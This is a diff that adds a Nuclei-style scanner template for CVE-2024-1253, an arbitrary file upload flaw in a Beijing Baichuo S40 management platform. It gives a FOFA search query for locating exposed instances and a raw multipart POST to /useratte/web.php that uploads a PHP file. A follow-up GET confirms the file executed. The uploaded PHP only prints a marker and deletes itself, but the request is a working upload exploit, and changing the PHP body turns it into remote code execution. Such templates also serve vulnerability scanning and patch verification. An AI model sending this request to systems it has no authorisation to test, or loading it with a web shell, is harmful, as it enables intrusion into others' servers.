@@ -1,0 +1,60 @@
+id: baichuo-webphp-file-upload
+
+info:
+  name: 北京百绰智能S40管理平台 web.php 组件任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="Smart管理平台"
+    北京百绰智能S40管理平台20240126版本中，/useratte/web.php组件存在一处高危漏洞。攻击者可通过操控file_upload参数实现非授权文件上传，从而在目标系统上执行任意代码。该漏洞的利用链已公开，可能被用于远程代码执行攻击。
+  reference:
+  - CVE-2024-1253
+  tags: 北京百绰智能S40管理平台
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /useratte/web.php? HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: PHPSESSID=cb5c0eb7b9fabee76431aaebfadae6db
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
+    Upgrade-Insecure-Requests: 1
+    Te: trailers
+    Connection: close
+
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="file_upload"; filename="NTest.php"
+    Content-Type: application/octet-stream
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="id_type"
+
+    1
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="1_ck"
+
+    1_radhttp
+    -----------------------------42328904123665875270630079328
+    Content-Disposition: form-data; name="mode"
+
+    import
+    -----------------------------42328904123665875270630079328
+- raw:
+  - |
+    GET /upload/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
